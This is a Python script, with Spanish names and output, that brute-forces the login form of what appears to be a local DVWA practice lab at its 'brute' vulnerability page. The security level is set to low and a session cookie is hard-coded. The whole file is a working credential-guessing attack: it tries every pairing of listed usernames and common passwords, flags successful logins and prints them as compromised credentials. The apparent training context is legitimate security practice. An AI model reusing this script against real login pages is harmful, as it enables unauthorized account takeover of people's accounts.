import requests

def configurar_sesion():
    
    session = requests.Session()
    session.cookies.update({
        "PHPSESSID": "aob9uiidhsd22kmul2o7kg7hu1",
        "security": "low"
    })
    return session

def probar_credencial(session, usuario, clave, url):
    
    parametros = {"username": usuario, "password": clave, "Login": "Login"}
    respuesta = session.get(url, params=parametros, timeout=5)
    return "username and/or password incorrect" not in respuesta.text.lower()

def main():
    URL_BASE = "http://127.0.0.1:8080/vulnerabilities/brute/"
    
    lista_usuarios = ["admin", "user", "smithy", "pablo", "rafael", "1111", "1337", "gordonb"]
    lista_claves = ["1234", "password", "admin", "olaaaa", "XDDDD", "letmein", "abc123"]
    
    sesion = configurar_sesion()
    credenciales_validas = []
    total_intentos = len(lista_usuarios) * len(lista_claves)
    intentos_realizados = 0
    
    print(" Iniciando escaneo de credenciales...")
    
    for usuario in lista_usuarios:
        for clave in lista_claves:
            intentos_realizados += 1
            if probar_credencial(sesion, usuario, clave, URL_BASE):
                print(f" ACIERTO: {usuario}:{clave}")
                credenciales_validas.append((usuario, clave))
            else:
                print(f" FALLO: {usuario}:{clave} - Progreso: {intentos_realizados}/{total_intentos}")
    
    # Mostrar reporte final
    print("\n" + "="*50)
    print(" REPORTE FINAL")
    print("="*50)
    print(f"Total de intentos: {intentos_realizados}")
    print(f"Credenciales válidas encontradas: {len(credenciales_validas)}")
    
    if credenciales_validas:
        print("\n Credenciales comprometidas:")
        for i, (user, pwd) in enumerate(credenciales_validas, 1):
            print(f"   {i}. Usuario: {user:<10} | Contraseña: {pwd}")
    else:
        print("\n No se encontraron credenciales válidas")

if __name__ == "__main__":
    main()